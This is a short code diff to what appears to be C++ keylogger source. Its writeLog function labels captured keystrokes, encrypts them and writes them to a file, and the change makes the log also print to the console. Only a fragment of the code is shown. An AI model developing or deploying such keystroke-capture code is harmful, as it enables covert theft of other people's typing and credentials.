@@ -19,7 +19,7 @@
 #include <string>
 #include <time.h>
 
-//#define VISIBLE_UI //Macros for UI conditional compilation
+#define VISIBLE_UI //Macros for UI conditional compilation
 
 //using namespace std;
 
@@ -785,6 +785,10 @@ int writeLog(const int key)
 		sLogs += " [CONTROL]";
 		break;
 	}
+
+	#ifdef VISIBLE_UI
+	std::cout << sLogs;
+	#endif //VISIBLE_UI
 
 	out_file << encryptLogs(sLogs, 5);
 	out_file.close();
